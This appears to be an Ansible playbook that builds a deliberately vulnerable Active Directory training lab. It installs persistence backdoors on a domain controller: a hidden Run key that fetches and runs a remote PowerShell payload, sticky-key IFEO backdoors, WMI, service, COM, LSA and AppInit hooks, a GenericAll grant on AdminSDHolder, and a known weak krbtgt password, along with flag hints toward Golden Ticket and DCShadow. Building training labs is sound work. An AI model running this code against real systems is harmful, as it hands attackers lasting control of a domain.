---
# ==============================================================================
# DVAD - Phase 5: Persistence (PER-001..PER-037)
# Target: dc01.corp.local (most of these require DA / SYSTEM on the DC)
# ==============================================================================

# ------------------------------------------------------------------------------
# PER-001: Registry Run keys
# ------------------------------------------------------------------------------
- name: PER-001 - HKLM Run key persistence
  ansible.windows.win_shell: |-
    & reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /v DVADUpdater /t REG_SZ /d "powershell.exe -ep bypass -w hidden -c IEX (new-object net.webclient).downloadstring('http://10.10.0.100/payload.ps1')" /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-002 / PER-003 / PER-013: IFEO debugger on accessibility tools
# ------------------------------------------------------------------------------
- name: PER-002/003/013 - IFEO Debugger on sethc/utilman/osk/Narrator/Magnify
  ansible.windows.win_shell: |-
    foreach ($t in @('sethc.exe','utilman.exe','osk.exe','Narrator.exe','Magnify.exe','DisplaySwitch.exe','AtBroker.exe')) {
      $k = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$t"
      & reg.exe add $k /v Debugger /t REG_SZ /d "cmd.exe" /f | Out-Null
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-004: Hidden persistence service
# ------------------------------------------------------------------------------
- name: PER-004 - PersistenceService scaffold
  ansible.windows.win_shell: |-
    New-Item -ItemType Directory -Path C:\Windows\Temp\persist -Force | Out-Null
    Set-Content -Path C:\Windows\Temp\persist\beacon.bat -Value "@echo off`r`nrem persistence stub" -Force
    if (-not (Get-Service -Name PersistenceService -ErrorAction SilentlyContinue)) {
      New-Service -Name 'PersistenceService' `
        -BinaryPathName 'C:\Windows\Temp\persist\beacon.bat' `
        -StartupType Automatic | Out-Null
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-005: Scheduled task AtStartup
# ------------------------------------------------------------------------------
- name: PER-005 - UpdaterService scheduled task
  ansible.windows.win_shell: |-
    & schtasks.exe /Create /TN 'UpdaterService' /TR 'powershell.exe -ep bypass -w hidden -c Start-Sleep 1' /SC ONSTART /RU SYSTEM /F | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-006: WMI Event Subscription
# ------------------------------------------------------------------------------
- name: PER-006 - WMI permanent event subscription
  ansible.windows.win_shell: |-
    try {
      $filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{
        Name='DVADFilter'
        EventNamespace='root\cimv2'
        QueryLanguage='WQL'
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 200"
      }
      $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{
        Name='DVADConsumer'
        CommandLineTemplate="powershell.exe -ep bypass -w hidden -c Start-Sleep 1"
      }
      Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{Filter=$filter; Consumer=$consumer} | Out-Null
    } catch { Write-Host "WMI subscription: $($_.Exception.Message)" }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-007: Netsh helper DLL (placeholder reg key — no real DLL shipped)
# ------------------------------------------------------------------------------
- name: PER-007 - Netsh helper key
  ansible.windows.win_shell: |-
    & reg.exe add 'HKLM\SOFTWARE\Microsoft\NetSh' /v DVADHelper /t REG_SZ /d netshhelper.dll /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-008: COM Hijacking - TreatAs on a benign CLSID redirecting to evil DLL
# ------------------------------------------------------------------------------
- name: PER-008 - COM hijack on MMDeviceEnumerator CLSID
  ansible.windows.win_shell: |-
    $clsid = '{BCDE0395-E52F-467C-8E3D-C4579291692E}'
    & reg.exe add "HKLM\SOFTWARE\Classes\CLSID\$clsid\TreatAs" /ve /t REG_SZ /d "{99999999-9999-9999-9999-999999999999}" /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-009 / PER-026: Authentication Package - register a fake LSA pkg name.
# We can't drop a real signed DLL, so set the registry pointer for the chain.
# ------------------------------------------------------------------------------
- name: PER-009/026 - LSA Authentication Packages backdoor entry
  ansible.windows.win_shell: |-
    $k = 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
    $cur = (Get-ItemProperty -Path "Registry::$k" -Name 'Authentication Packages').'Authentication Packages'
    if ($cur -notcontains 'mimilib') {
      $new = $cur + 'mimilib'
      Set-ItemProperty -Path "Registry::$k" -Name 'Authentication Packages' -Value $new -Type MultiString
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-010: Time provider DLL hijack hook
# ------------------------------------------------------------------------------
- name: PER-010 - W32Time provider hijack hook
  ansible.windows.win_shell: |-
    & reg.exe add 'HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DVADProvider' /v DllName /t REG_SZ /d 'C:\Windows\System32\dvadtime.dll' /f | Out-Null
    & reg.exe add 'HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DVADProvider' /v Enabled /t REG_DWORD /d 0 /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-011: BootExecute - prepend a benign autocheck command
# ------------------------------------------------------------------------------
- name: PER-011 - BootExecute modification
  ansible.windows.win_shell: |-
    $cur = (Get-ItemProperty -Path 'Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' -Name BootExecute).BootExecute
    if ($cur -notcontains 'autocheck dvadboot') {
      $new = @('autocheck dvadboot') + $cur
      Set-ItemProperty -Path 'Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' -Name BootExecute -Value $new -Type MultiString
    }
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-012: AppInit_DLLs
# ------------------------------------------------------------------------------
- name: PER-012 - AppInit_DLLs enabled
  ansible.windows.win_shell: |-
    $k = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
    & reg.exe add $k /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f | Out-Null
    & reg.exe add $k /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f | Out-Null
    & reg.exe add $k /v AppInit_DLLs /t REG_SZ /d 'C:\Windows\System32\dvadinit.dll' /f | Out-Null
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-014: RID hijack hint — flag only. Doing this for real on a running DC
# corrupts SAM; we drop a marker so participants see the path.
# ------------------------------------------------------------------------------
- name: PER-014 - RID hijack hint
  ansible.windows.win_file:
    path: 'C:\Flags'
    state: directory
  ignore_errors: yes
- name: PER-014 - RID hijack flag marker
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-PER-014-RID-Hijack.txt'
    content: |
      PER-014: Set SAM\Users\<acct>\F[0x30..0x33] to 000001F4 (RID 500) for hidden DA.
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-015 / PER-033: AdminSDHolder ACL injection (user2 -> GenericAll)
# SDProp re-applies every 60 min; self-healing.
# ------------------------------------------------------------------------------
- name: PER-015/033 - AdminSDHolder GenericAll for user2
  ansible.windows.win_shell: |-
    Import-Module ActiveDirectory
    $src = Get-ADUser -Identity user2
    $domain = (Get-ADDomain).DistinguishedName
    $dn = "CN=AdminSDHolder,CN=System,$domain"
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
    $acl = Get-Acl "AD:\$dn"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,'GenericAll','Allow')
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\$dn" -AclObject $acl
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-016: SID History injection precondition. Requires krbtgt + cross-domain
# write; covered by CRED-015 (Configuration NC write) and PER-018. Flag only.
# ------------------------------------------------------------------------------
- name: PER-016 - SID History injection flag marker
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-PER-016-SIDHistory.txt'
    content: "PER-016: Mimikatz sid::patch + DsAddSidHistory across child->parent trust."
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-017: DCShadow precondition (Configuration NC write). Wired in CRED-015.
# ------------------------------------------------------------------------------
- name: PER-017 - DCShadow flag marker
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-PER-017-DCShadow.txt'
    content: "PER-017: Use mimikatz lsadump::dcshadow with CRED-015 attacker."
  ignore_errors: yes

# ------------------------------------------------------------------------------
# PER-018: Golden Ticket - precondition is krbtgt hash. Set a known-bad
# krbtgt password so participants can compute the hash deterministically.
# ------------------------------------------------------------------------------
- name: PER-018 - Reset krbtgt to a known weak password (Golden Ticket precondition)
  ansible.windows.win_shell: |-
    Import-Module ActiveDirectory
    try {
      $p = ConvertTo-SecureString 'KrbtgtDVAD2024!' -AsPlainText -Force
      Set-ADAccountPassword -Identity krbtgt -NewPassword $p -Reset
    } catch { Write-Host "krbtgt reset: $($_.Exception.Message)" }
  ignore_errors: yes

- name: PER-018 - Golden Ticket flag marker
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-PER-018-GoldenTicket.txt'
    content: |
      PER-018: krbtgt password is KrbtgtDVAD2024! (derive hash, forge TGT for any user).
  ignore_errors: yes

# ------------------------------------------------------------------------------
